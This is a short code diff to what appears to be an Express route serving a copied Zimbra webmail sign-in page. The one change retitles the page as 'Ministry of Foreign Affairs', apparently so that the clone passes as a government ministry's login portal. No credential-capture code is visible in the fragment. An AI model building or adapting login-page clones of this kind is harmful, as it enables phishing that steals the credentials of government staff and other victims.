@@ -27,7 +27,7 @@ router.get('/', (req, res) => {
     <html class="user_font_size_normal" lang="en"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
     
         
-        <title>Zimbra Web Client Sign In</title>
+        <title>Ministry of Foreign Affairs</title>
         <meta name="viewport" content="width=device-width, initial-scale=1.0">
         <meta name="description" content="Zimbra provides open source server and client software for messaging and collaboration. To find out more visit https://www.zimbra.com.">
         <meta name="apple-mobile-web-app-capable" content="yes">
